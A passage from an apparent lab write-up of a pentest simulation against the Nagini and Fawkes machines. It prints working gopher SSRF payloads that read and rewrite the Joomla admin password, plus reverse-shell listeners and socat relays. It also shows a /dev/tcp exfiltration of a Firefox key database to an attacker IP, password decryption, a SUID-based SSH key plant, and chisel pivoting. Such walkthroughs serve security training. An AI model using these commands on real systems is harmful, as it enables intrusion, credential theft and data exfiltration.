   8   │     public $editor = 'tinymce';
   9   │     public $captcha = '0';
  10   │     public $list_limit = '20';
  11   │     public $access = '1';
  12   │     public $debug = '0';
  13   │     public $debug_lang = '0';
  14   │     public $debug_lang_const = '1';
  15   │     public $dbtype = 'mysqli';
  16   │     public $host = 'localhost';
  17   │     public $user = 'goblin';
  18   │     public $password = '';
  19   │     public $db = 'joomla';
  20   │     public $dbprefix = 'joomla_';
  21   │     public $live_site = '';
  22   │     public $secret = 'ILhwP6HTYKcN7qMh';
  23   │     public $gzip = '0';
  24   │     public $error_reporting = 'default';
  25   │     public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&amp;lang={langcode}';
  26   │     public $ftp_host = '';
  27   │     public $ftp_port = '';
  28   │     public $ftp_user = '';
  29   │     public $ftp_pass = '';
  30   │     public $ftp_root = '';
  31   │     public $ftp_enable = '0';
  32   │     public $offset = 'UTC';
  33   │     public $mailonline = '1';
  34   │     public $mailer = 'mail';
  35   │     public $mailfrom = 'site_admin@nagini.hogwarts';
  36   │     public $fromname = 'Joomla CMS';
  37   │     public $sendmail = '/usr/sbin/sendmail';
  38   │     public $smtpauth = '0';
  39   │     public $smtpuser = '';
  40   │     public $smtppass = '';
  41   │     public $smtphost = 'localhost';
  42   │     public $smtpsecure = 'none';
  43   │     public $smtpport = '25';
  44   │     public $caching = '0';
  45   │     public $cache_handler = 'file';
  46   │     public $cachetime = '15';
  47   │     public $cache_platformprefix = '0';
  48   │     public $MetaDesc = '';
  49   │     public $MetaKeys = '';
  50   │     public $MetaTitle = '1';
  51   │     public $MetaAuthor = '1';
  52   │     public $MetaVersion = '0';
  53   │     public $robots = '';
  54   │     public $sef = '1';
  55   │     public $sef_rewrite = '0';
  56   │     public $sef_suffix = '0';
  57   │     public $unicodeslugs = '0';
  58   │     public $feed_limit = '10';
  59   │     public $feed_email = 'none';
  60   │     public $log_path = '/var/www/html/joomla/administrator/logs';
  61   │     public $tmp_path = '/var/www/html/joomla/tmp';
  62   │     public $lifetime = '15';
  63   │     public $session_handler = 'database';
  64   │     public $shared_session = '0';
  65   │ }
</code></pre></div></div>

<p>We found user <strong>goblin</strong> in database.</p>

<p>At this point we have the SSRF vulnerability but we cannot execute the malicious content we uploaded. Now comes into play <strong>gopherus</strong>, we can get this script on github.</p>

<p>Gopherus Description:</p>

<p>If you know a place which is SSRF vulnerable then, this tool will help you to generate Gopher payload for exploiting SSRF (Server Side Request Forgery) and gaining RCE (Remote Code Execution).</p>

<p>This tool will be used to view the contents of the database, as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2.7 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: show databases;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------

</code></pre></div></div>

<p>If we enter this query in the field SSRF vulnarable and reload several times we can see the mysql output.</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/first-query.png" alt="" /></p>

<p>At this point we are interested in viewing joomla credentials.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2.7 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; describe joomla_users;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%23%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%64%65%73%63%72%69%62%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2.7 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; select name,username,email,password from joomla_users;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%43%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%73%65%6c%65%63%74%20%6e%61%6d%65%2c%75%73%65%72%6e%61%6d%65%2c%65%6d%61%69%6c%2c%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------

</code></pre></div></div>

<p>Finally we can see the output.</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/finally-output.png" alt="" /></p>

<p>Let’s try to crack the password with John:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> john -w:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

</code></pre></div></div>

<p>At this point of SSRF vulnerability we can do more things, for example since we have privileges to be able to list the database we can try to change database values. We can try to change the password of the <strong>joomla</strong> site administrator user.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -n "password123" | md5sum
482c811da5d5b4bc6d497ffa98491e38  -

python2.7 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; update joomla_users set password='482c811da5d5b4bc6d497ffa98491e38' where username='site_admin';

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%34%38%32%63%38%31%31%64%61%35%64%35%62%34%62%63%36%64%34%39%37%66%66%61%39%38%34%39%31%65%33%38%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------

</code></pre></div></div>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/update.png" alt="" /></p>

<p>Finally, we can access in the joomla panel to the administrator.</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/panel-administrator.png" alt="" /></p>

<p>To gain access to the machine with an interactive terminal it is quite simple in joomla. In the path <strong>Extension&gt;Tamplates&gt;Tamplates&gt;Protostar&gt;Error.php</strong> we can do the following:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/error.php.png" alt="" /></p>

<p>To gain access we need socat to stay listening for a connection on port 4343 to redirect on the attacking machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Aragog
 
root@Aragog:~# ./socat TCP-LISTEN:4343.fork TCP:192.168.1.21:443


Attacker

nc -nlvp 443
listening on [any] 443 ...

</code></pre></div></div>

<p>Finally, we can search for a page that does not exist in order to get an error.</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/web-error.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 59596
bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Nagini:/var/www/html/joomla$ 
</code></pre></div></div>

<h2 id="got-root-1">Got Root</h2>

<p>We found the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Nagini:/var/www/html/joomla$ ls -la /home/snape/
total 40
drwxr-xr-x 4 snape snape 4096 Aug 23 22:22 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw------- 1 snape snape  780 Aug 26 19:52 .bash_history
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
drwxr-xr-x 3 snape snape 4096 Aug 23 20:15 .local
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
-rw-r--r-- 1 snape snape  565 Aug 23 20:58 authorized_keys
www-data@Nagini:/var/www/html/joomla$ cat /home/snape/.creds.txt 
TG92ZUBsaWxseQ==
www-data@Nagini:/var/www/html/joomla$ cat /home/snape/.creds.txt | base64 -d; echo
Love@lilly
www-data@Nagini:/var/www/html/joomla$ su snape
Password: 
snape@Nagini:/var/www/html/joomla$ 
</code></pre></div></div>
<p>The first binary is interesting, appears to be the <strong>cp</strong> binary but with SUID permissions:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snape@Nagini:/var/www/html/joomla$ find / -perm -4000 2&gt; /dev/null | xargs ls -al
-rwsr-xr-x 1 hermoine hermoine   146880 Apr  4  2021 /home/hermoine/bin/su_cp
-rwsr-xr-x 1 root     root        54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root     root        44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root     root        51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root     root        63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root     root        63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root     root        34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-- 1 root     messagebus  51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root     root       436552 Feb  1  2020 /usr/lib/openssh/ssh-keysign
</code></pre></div></div>

<p>If we can run <strong>cp</strong> with owner privileges, we can manage to sneak our ssh public key into your <strong>authorized_keys</strong>. In this way:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snape@Nagini:~$ /home/hermoine/bin/su_cp authorized_keys /home/hermoine/.ssh/authorized_keys
snape@Nagini:~$ 

proxychains ssh hermoine@10.10.0.129
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.10.0.129:22-&lt;&gt;&lt;&gt;-OK
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug 23 21:02:19 2024 from 10.10.0.128
hermoine@Nagini:~$ whoami
hermoine
hermoine@Nagini:~$
</code></pre></div></div>

<p>We found this in personal directory of <strong>hermoine</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hermoine@Nagini:~$ ls -la .mozilla/
extensions/          firefox/             systemextensionsdev/ 
hermoine@Nagini:~$ ls -la .mozilla/firefox/
total 28
drwx------  5 hermoine hermoine 4096 Jun  1  2019  .
drwx------  5 hermoine hermoine 4096 Jun  1  2019  ..
drwx------  4 hermoine hermoine 4096 Apr  4  2021 'Crash Reports'
drwx------  2 hermoine hermoine 4096 Jun  1  2019 'Pending Pings'
drwx------ 14 hermoine hermoine 4096 Aug 23 22:15  g2mhbq0o.default
-rw-r--r--  1 hermoine hermoine   54 Jun  1  2019  installs.ini
-rw-r--r--  1 hermoine hermoine  175 Jun  1  2019  profiles.ini
hermoine@Nagini:~$ ls -la .mozilla/firefox/g2mhbq0o.default/
total 13092
drwx------ 14 hermoine hermoine    4096 Aug 23 22:15 .
drwx------  5 hermoine hermoine    4096 Jun  1  2019 ..
-rw-r--r--  1 hermoine hermoine       0 Apr  4  2021 .parentlock
-rw-r--r--  1 hermoine hermoine       0 Apr  4  2021 AlternateServices.txt
-rw-r--r--  1 hermoine hermoine       0 Apr  4  2021 ClientAuthRememberList.txt
-rw-r--r--  1 hermoine hermoine       0 Nov 19  2020 SecurityPreloadState.txt
-rw-r--r--  1 hermoine hermoine      64 Apr  4  2021 SiteSecurityServiceState.txt
-rw-------  1 hermoine hermoine    3560 Apr  4  2021 addonStartup.json.lz4
-rw-r--r--  1 hermoine hermoine    1923 Apr  4  2021 addons.json
-rw-------  1 hermoine hermoine  338425 Sep 11  2019 blocklist.xml
drwx------  2 hermoine hermoine    4096 Dec 20  2020 bookmarkbackups
-rw-------  1 hermoine hermoine     216 Apr  4  2021 broadcast-listeners.json
-rw-------  1 hermoine hermoine  294912 Dec 20  2020 cert9.db
-rw-------  1 hermoine hermoine      83 Apr  4  2021 cert_override.txt
-rw-------  1 hermoine hermoine     160 Apr  4  2021 compatibility.ini
-rw-------  1 hermoine hermoine     939 Jun  1  2019 containers.json
-rw-r--r--  1 hermoine hermoine  229376 Apr  4  2021 content-prefs.sqlite
-rw-r--r--  1 hermoine hermoine  524288 Apr  4  2021 cookies.sqlite
drwx------  3 hermoine hermoine    4096 Apr  4  2021 crashes
drwx------  4 hermoine hermoine    4096 Apr  4  2021 datareporting
-rw-r--r--  1 hermoine hermoine       2 Apr  4  2021 enumerate_devices.txt
-rw-------  1 hermoine hermoine    1301 Apr  4  2021 extension-preferences.json
drwx------  2 hermoine hermoine    4096 Jun  1  2019 extensions
-rw-------  1 hermoine hermoine   47846 Apr  4  2021 extensions.json
-rw-r--r--  1 hermoine hermoine 5242880 Apr  4  2021 favicons.sqlite
drwx------  3 hermoine hermoine    4096 Apr  4  2021 features
-rw-r--r--  1 hermoine hermoine  262144 Apr  4  2021 formhistory.sqlite
drwx------  2 hermoine hermoine    4096 Apr  4  2021 gmp
drwxr-xr-x  3 hermoine hermoine    4096 Nov 19  2020 gmp-gmpopenh264
-rw-------  1 hermoine hermoine     820 Dec 20  2020 handlers.json
-rw-------  1 hermoine hermoine  294912 Jun  2  2019 key4.db
lrwxrwxrwx  1 hermoine hermoine      18 Apr  4  2021 lock -&gt; 192.168.1.54:+6319
-rw-------  1 hermoine hermoine    1072 Apr  4  2021 logins-backup.json
-rw-------  1 hermoine hermoine     593 Apr  4  2021 logins.json
drwx------  2 hermoine hermoine    4096 Jun  1  2019 minidumps
-rw-r--r--  1 hermoine hermoine   98304 Apr  4  2021 permissions.sqlite
-rw-------  1 hermoine hermoine     872 Jun  1  2019 pkcs11.txt
-rw-r--r--  1 hermoine hermoine 5242880 Apr  4  2021 places.sqlite
-rw-------  1 hermoine hermoine     172 Oct 29  2020 pluginreg.dat
-rw-------  1 hermoine hermoine   16239 Apr  4  2021 prefs.js
-rw-r--r--  1 hermoine hermoine   65536 Apr  4  2021 protections.sqlite
drwx------  2 hermoine hermoine    4096 Apr  4  2021 saved-telemetry-pings
-rw-------  1 hermoine hermoine     387 Apr  4  2021 search.json.mozlz4
drwxr-xr-x  2 hermoine hermoine    4096 Oct 29  2020 security_state
-rw-r--r--  1 hermoine hermoine       2 Apr  4  2021 serviceworker.txt
-rw-------  1 hermoine hermoine     288 Apr  4  2021 sessionCheckpoints.json
-rw-------  1 hermoine hermoine    1297 Apr  4  2021 sessionstore.jsonlz4
-rw-------  1 hermoine hermoine      18 Oct 29  2020 shield-preference-experiments.json
-rw-------  1 hermoine hermoine      84 Jun  1  2019 shield-recipe-client.json
drwxr-xr-x  5 hermoine hermoine    4096 Jun  1  2019 storage
-rw-r--r--  1 hermoine hermoine    5632 Apr  4  2021 storage.sqlite
-rwx------  1 hermoine hermoine      29 Jun  1  2019 times.json
drwx------  4 hermoine hermoine    4096 Apr  4  2021 weave
-rw-r--r--  1 hermoine hermoine  589824 Apr  4  2021 webappsstore.sqlite
-rw-------  1 hermoine hermoine     338 Apr  4  2021 xulstore.json
hermoine@Nagini:~$ 
</code></pre></div></div>
<p>Having this folder with these files is a risk because we can get to decrypt the user and passwords of this <strong>firefox</strong> account using a github tool, as follows:</p>

<p>link: <a href="https://github.com/lclevy/firepwd">firepwd</a></p>

<p>first we need to transfer the <strong>key4.db</strong> and <strong>profiles.json</strong> files to the <em>*firepwd</em> directory:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aragog:~# ./socat TCP-LISTEN:4343.fork TCP:192.168.1.21:443

hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ cat &lt; key4.db &gt; /dev/tcp/10.10.0.128/4343

 nc -nlvp 443 &gt; key.db
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 59662
❯ ls key.db
 key.db

</code></pre></div></div>

<p>Command output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
 mozilla_db   venv   firepwd.py   key4.db   LICENSE   logins.json   mozilla_pbe.pdf   mozilla_pbe.svg   readme.md   requirements.txt
❯ python3 firepwd.py
globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'2065c62fe9dc4d8352677299cc0f2cb8'
 }
entrySalt: b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'ceedd70a1cfd8295250bcfed5ff49b6c878276b968230619a2c6c51aa4ea5c8e'
 }
entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'@Alohomora#123'
</code></pre></div></div>

<p>Root</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ su root
Password: 
root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# whoami
root
root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# 
</code></pre></div></div>

<p>Remember to transfer your public key to the root <strong>.ssh</strong>.</p>

<h1 id="fawkes">Fawkes</h1>

<p>Now it’s our turn to engage the <strong>Fawkes</strong> machine, the level is rising…</p>

<p>Now we are on the Nagini machine with the root user, at this point we run <strong>hostname -I</strong> to see other interfaces in order to scan them for more visible computers within the other networks, for this we have to change the IP of the <strong>hostDiscovery.sh</strong> script.</p>

<p>We realize that there is another <strong>192.168.100.130</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Nagini:~# hostname -I
192.168.100.130 10.10.0.129 
</code></pre></div></div>
<p>We change whit another IP:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

## SIGINT

cleanup(){

        echo -e "\nBYE..\n"
        exit 1
}


trap cleanup SIGINT


## Taget 10.10.0.128

echo -e "\nScanning in the network...\n"

for ipAddress in $(seq 1 254); do
        for port in 21 22 80 443 445 8080; do

                timeout 1 bash -c "echo '' &gt; /dev/tcp/192.168.100.$ipAddress/$port" &amp;&gt; /dev/null &amp;&amp; echo "[+] Host: 192.168.100.$ipAddress - PORT $port - OPEN" &amp;
        done
done; wait

echo -e "\n All Already :)\n"
</code></pre></div></div>

<p>Output</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Nagini:~# bash hostDiscovery.sh 

Scanning in the network...

[+] Host: 192.168.100.1 - PORT 445 - OPEN
[+] Host: 192.168.100.128 - PORT 21 - OPEN
[+] Host: 192.168.100.128 - PORT 80 - OPEN
[+] Host: 192.168.100.130 - PORT 22 - OPEN
[+] Host: 192.168.100.130 - PORT 80 - OPEN
[+] Host: 192.168.100.128 - PORT 22 - OPEN

 All Already :)

root@Nagini:~# 
</code></pre></div></div>

<p>Now we have to transfer CHISEL and SOCAT . It is very important to have the same configuration if we want to see the <strong>Fawkes - 192.168.100.128</strong> machine on our attacker machine.</p>

<p>1- Chisel Server in our attacker machine:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./chisel server --reverse -p 1234
2024/08/27 18:36:15 server: Reverse tunnelling enabled
2024/08/27 18:36:15 server: Fingerprint S09fQ8nC8q9+eLcjEThZMKnPWlSWo2BbiAaCrBr1doA=
2024/08/27 18:36:15 server: Listening on http://0.0.0.0:1234
2024/08/27 18:37:40 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
2024/08/27 18:47:38 server: session#2: tun: proxy#R:127.0.0.1:8888=&gt;socks: Listening
</code></pre></div></div>

<p>2- Connect with chisel the machine <strong>Aragog</strong> on the server chisel</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aragog:~# ./chisel client 192.168.1.21:1234 R:socks
2024/08/27 22:07:40 client: Connecting to ws://192.168.1.21:1234
2024/08/27 22:07:40 client: Connected (Latency 827.02µs)

</code></pre></div></div>

<p>3- Create other ssh connection in the <strong>Aragog</strong> machine for this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aragog:~# ./socat TCP-LISTEN:5656.fork TCP:192.168.1.21:1234

</code></pre></div></div>
<p>4- Create ssh connection on the <strong>Nagini</strong> machine and connect to the chisel client on the chisel server of our attacking machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Nagini:~# ./chisel client 10.10.0.128:5656 R:8888:socks
</code></pre></div></div>

<p>El último paso es modificar <strong>/etc/proxychains.conf</strong>, in the following way:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050

socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
</code></pre></div></div>

<p>And we are ready to perform the scanning of the <strong>Fawkes</strong> machine.</p>

<h2 id="scanreport-2">ScanReport</h2>

<p>We found this in nmap scan:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>seq 1 65536 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -n -v 192.168.100.128 2&gt;&amp;1 | grep "tcp open"

22/tcp open  ssh
80/tcp open  http
21/tcp open  ftp
2222/tcp open  EtherNetIP-1
9898/tcp open  monkeycom
</code></pre></div></div>

<p>First we try to connect with anonymous on the ftp server, to know if it is enabled and see what can be inside.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains ftp 192.168.100.128
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;-127.0.0.1:1080-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-192.168.100.128:21-&lt;&gt;&lt;&gt;-OK
Connected to 192.168.100.128.
220 (vsFTPd 3.0.3)
Name (192.168.100.128:arc4he): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; 

</code></pre></div></div>

<p>It worked and we found this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; dir
229 Entering Extended Passive Mode (|||18531|)
|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-192.168.100.128:18531-&lt;&gt;&lt;&gt;-OK
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
^C
receive aborted. Waiting for remote to finish abort.
226 Directory send OK.
500 Unknown command.
73 bytes received in 00:01 (0.04 KiB/s)
ftp&gt; binary
200 Switching to Binary mode.
ftp&gt; get ser|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-192.168.100.128:34382-&lt;&gt;&lt;&gt;-OK

receive aborted. Waiting for remote to finish abort.
17 bytes received in 00:01 (0.01 KiB/s)

500 Unknown command.
ftp&gt; get server_hogwarts
local: server_hogwarts remote: server_hogwarts
229 Entering Extended Passive Mode (|||31028|)
